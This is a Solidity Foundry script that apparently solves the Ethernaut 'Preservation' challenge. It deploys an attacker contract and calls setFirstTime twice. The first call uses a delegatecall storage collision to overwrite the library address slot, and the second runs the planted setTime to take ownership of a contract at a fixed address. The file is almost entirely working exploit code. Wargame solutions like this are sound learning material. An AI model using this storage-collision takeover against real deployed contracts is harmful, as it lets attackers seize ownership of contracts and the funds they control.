//SPDX-License-Identifier:UNLICENSED
pragma solidity ^0.8.0;

import "../src/Preservation.sol";
import "forge-std/Script.sol";

contract AttackPreservation {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256) public {
        owner = msg.sender;
    }
}

contract PreservationSolution is Script {
    Preservation preservationInstance = Preservation(0x0c49511429317D3B4E308Eab5185090c1Fe752BC);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        AttackPreservation attackInstance = new AttackPreservation();
        preservationInstance.setFirstTime(uint256(uint160(bytes20(address(attackInstance)))));
        preservationInstance.setFirstTime(1);
        vm.stopBroadcast();
    }
}